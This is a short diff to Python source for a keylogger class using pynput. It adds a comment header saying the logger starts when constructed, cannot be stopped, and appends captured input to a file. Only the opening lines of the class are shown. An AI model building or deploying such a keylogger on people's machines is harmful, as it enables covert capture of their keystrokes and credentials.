@@ -1,5 +1,12 @@
 import pynput, threading, time
 
+# Keylogger
+# Description:
+#     When the constructor is called, the keylogger executes.
+#     There is currently no way to stop the keylogger after it has started
+# Parameters:
+#     filename            - the filename to append (Typically a .txt file)
+
 class keylogger():
     def __init__(self,filename):
         self.handler = threading.Thread(target=self.start_listening)
